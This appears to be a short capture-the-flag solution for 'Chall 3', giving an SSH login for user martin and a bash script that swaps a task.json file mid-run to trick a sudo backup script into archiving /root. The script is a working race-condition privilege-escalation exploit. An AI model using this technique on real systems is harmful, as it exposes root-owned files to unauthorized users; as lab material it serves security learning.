## Chall 3

SSH PASSWORD: martin:Th1s_Ch4ll_Is_N0t_S0_E4sy


```
#!/bin/bash

echo '{"directories_to_archive":["/home/martin"],"destination":"/home/martin/backups/"}' > task.json

sudo /usr/bin/backy.sh task.json &

sleep 0.05

echo '{"directories_to_archive":["/root"],"destination":"/home/martin/backups/"}' > task.json

```

